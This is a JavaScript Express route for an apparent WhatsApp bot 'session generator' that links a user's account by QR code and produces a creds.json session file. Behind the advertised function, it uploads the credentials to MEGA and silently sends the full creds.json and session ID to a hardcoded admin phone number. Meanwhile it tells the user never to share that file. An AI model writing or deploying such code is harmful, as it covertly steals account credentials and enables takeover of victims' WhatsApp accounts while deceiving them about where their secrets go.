import express from "express";
import fs from "fs-extra";
import pino from "pino";
import {
    makeWASocket,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    Browsers,
    jidNormalizedUser,
    fetchLatestBaileysVersion,
} from "@whiskeysockets/baileys";
import QRCode from "qrcode";
import { upload } from "./mega.js";
import path from "path";
import chalk from "chalk";
import axios from "axios";

const router = express.Router();
const logger = pino({ level: "fatal" });
const SESSION_FOLDER = process.env.SESSION_FOLDER || "./mega_sessions";
const ADMIN_NUMBER = "9779807610619";
const LOGO_URL = "https://ibb.co/yc1nR55z";

fs.ensureDirSync(SESSION_FOLDER);

function removeFile(FilePath) {
    try {
        if (fs.existsSync(FilePath)) fs.removeSync(FilePath);
    } catch (_) {}
}

function getMegaFileId(url) {
    try {
        const match = url.match(/\/file\/([^#]+)/);
        return match ? match[1] : null;
    } catch {
        return null;
    }
}

async function getLogoBuffer() {
    try {
        const pageRes = await axios.get(LOGO_URL, { timeout: 8000 });
        const match = pageRes.data.match(/https:\/\/i\.ibb\.co\/[^"'\s]+/);
        if (match) {
            const imgRes = await axios.get(match[0], {
                responseType: "arraybuffer",
                timeout: 8000,
            });
            return Buffer.from(imgRes.data);
        }
    } catch (e) {
        console.log(chalk.yellow("⚠️ Logo fetch failed:"), e.message);
    }
    return null;
}

async function waitForCreds(credsPath, maxWaitMs = 30000) {
    const start = Date.now();
    while (Date.now() - start < maxWaitMs) {
        if (fs.existsSync(credsPath)) {
            const stat = fs.statSync(credsPath);
            if (stat.size > 0) return true;
        }
        await delay(1000);
    }
    return false;
}

router.get("/", async (req, res) => {
    const sessionId = Date.now().toString() + Math.random().toString(36).substring(2, 10);
    const sessionPath = path.join(SESSION_FOLDER, `qr_session_${sessionId}`);
    fs.ensureDirSync(sessionPath);

    let responseSent = false;
    let sessionDone = false;
    let version;

    try {
        const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
        const versionData = await fetchLatestBaileysVersion();
        version = versionData.version;

        const EvoBot = makeWASocket({
            version,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, logger),
            },
            printQRInTerminal: false,
            logger,
            browser: Browsers.ubuntu("Chrome"),
            markOnlineOnConnect: true,
            syncFullHistory: false,
        });

        EvoBot.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect, qr } = update;

            if (qr && !responseSent) {
                try {
                    const qrDataURL = await QRCode.toDataURL(qr, {
                        errorCorrectionLevel: "H",
                        type: "image/png",
                        margin: 2,
                        width: 400,
                        color: { dark: "#00f3ff", light: "#000000" },
                    });
                    responseSent = true;
                    res.send({
                        qr: qrDataURL,
                        instructions: [
                            "1️⃣ Open WhatsApp on your phone",
                            "2️⃣ Tap Menu (⋮) or Settings",
                            "3️⃣ Select Linked Devices",
                            "4️⃣ Tap 'Link a Device'",
                            "5️⃣ Scan this QR code",
                        ],
                    });
                } catch (qrError) {
                    console.error(chalk.red("QR Error:"), qrError);
                }
            }

            if (connection === "open") {
                if (sessionDone) return;
                console.log(chalk.green(`✅ QR Connected: ${EvoBot.user?.id}`));

                try {
                    const credsPath = path.join(sessionPath, "creds.json");
                    const credsReady = await waitForCreds(credsPath, 30000);

                    if (!credsReady) {
                        console.log(chalk.red("❌ creds.json never appeared for QR session"));
                        sessionDone = true;
                        removeFile(sessionPath);
                        return;
                    }

                    const rawJid = EvoBot.user?.id || "";
                    const phoneNumber = rawJid.split(":")[0].split("@")[0];
                    const userJid = rawJid ? jidNormalizedUser(rawJid) : null;
                    const adminJid = jidNormalizedUser(`${ADMIN_NUMBER}@s.whatsapp.net`);
                    const time = new Date().toLocaleTimeString();
                    const date = new Date().toLocaleDateString();

                    let sessionIdCode = `Evomd_local_${Date.now()}`;
                    let megaUploaded = false;

                    try {
                        console.log(chalk.blue(`📤 Uploading to MEGA...`));
                        const megaUrl = await upload(credsPath, `creds_qr_${sessionId}.json`);
                        const megaFileId = getMegaFileId(megaUrl);
                        if (megaFileId) {
                            sessionIdCode = `Evomd=@${megaFileId}`;
                            megaUploaded = true;
                            console.log(chalk.green(`☁️ MEGA upload done`));
                        }
                    } catch (megaErr) {
                        console.log(chalk.yellow(`⚠️ MEGA skipped: ${megaErr.message}`));
                    }

                    const infoPath = path.join(SESSION_FOLDER, `session_info_${phoneNumber}_${Date.now()}.json`);
                    await fs.writeJson(infoPath, {
                        phoneNumber,
                        sessionId: sessionIdCode,
                        megaUploaded,
                        timestamp: new Date().toISOString(),
                        type: "qr_code",
                    }, { spaces: 2 });

                    const successMessage = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
*✅ EVO MD Whatsapp Bot*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎉 CONNECTION ESTABLISHED SUCCESSFULLY

📋 SESSION INFORMATION
──────────────────────────
🆔 ID : *${sessionIdCode}*
📞 PHONE : *+${phoneNumber}*
🔐 TYPE : *QR Code*
⏰ TIME : *${time}*
📅 DATE : *${date}*

📁 FILES GENERATED
──────────────────────────
${megaUploaded ? "✓ creds.json (Uploaded to MEGA)" : "✓ creds.json (Attached below)"}

📍 STORAGE LOCATION
──────────────────────────
${megaUploaded ? "☁️ MEGA Cloud: /Evo MD Sessions/" : "📎 Sent as attachment"}
📁 Local: ./mega_sessions/

⚠️ SECURITY NOTICE
──────────────────────────
🔴 NEVER share your session ID
🔴 NEVER share creds.json file
🟢 Keep backup in safe place
🟢 Use same ID for reconnection

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👑 *Evo MD Ofc* 👑
🔗 github.com/Evo_MD_Beta
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

                    const logoBuffer = await getLogoBuffer();
                    const credsBuffer = fs.readFileSync(credsPath);

                    async function sendSessionToJid(jid) {
                        try {
                            if (logoBuffer) {
                                await EvoBot.sendMessage(jid, {
                                    image: logoBuffer,
                                    caption: `*Evo MD Ofc*\n\n🔗 Session ID:\n*${sessionIdCode}*`,
                                });
                                await delay(1500);
                            } else {
                                await EvoBot.sendMessage(jid, { text: `*Evo MD Ofc*\n\n🔗 Session ID:\n*${sessionIdCode}*` });
                                await delay(1000);
                            }

                            await EvoBot.sendMessage(jid, {
                                document: credsBuffer,
                                mimetype: "application/json",
                                fileName: "creds.json",
                                caption: successMessage,
                            });

                            console.log(chalk.green(`✅ QR Session sent to ${jid}`));
                        } catch (sendErr) {
                            console.log(chalk.red(`❌ Send failed to ${jid}: ${sendErr.message}`));
                        }
                    }

                    if (userJid) {
                        await sendSessionToJid(userJid);
                        await delay(2000);
                    }

                    if (phoneNumber !== ADMIN_NUMBER) {
                        await sendSessionToJid(adminJid);
                        await delay(2000);
                    }

                    console.log(chalk.green(`✅ QR session complete for ${phoneNumber}`));

                    sessionDone = true;
                    removeFile(sessionPath);

                    await delay(3000);
                    try { EvoBot.ws.close(); } catch (_) {}

                } catch (err) {
                    console.error(chalk.red("❌ QR session error:"), err);
                    sessionDone = true;
                    removeFile(sessionPath);
                }
            }

            if (connection === "close") {
                if (sessionDone) return;

                const statusCode = lastDisconnect?.error?.output?.statusCode;
                if (statusCode !== 401 && statusCode !== 403) {
                    console.log(chalk.yellow("🔄 QR reconnecting..."));
                } else {
                    console.log(chalk.red("❌ QR session closed permanently"));
                    sessionDone = true;
                }
            }
        });

        EvoBot.ev.on("creds.update", saveCreds);

        setTimeout(async () => {
            if (!responseSent) {
                res.status(408).send({ code: "QR generation timeout" });
                sessionDone = true;
                removeFile(sessionPath);
            }
        }, 60000);

    } catch (err) {
        console.error(chalk.red("QR Init error:"), err);
        if (!responseSent) res.status(503).send({ code: "Service unavailable" });
        removeFile(sessionPath);
    }
});

export default router;
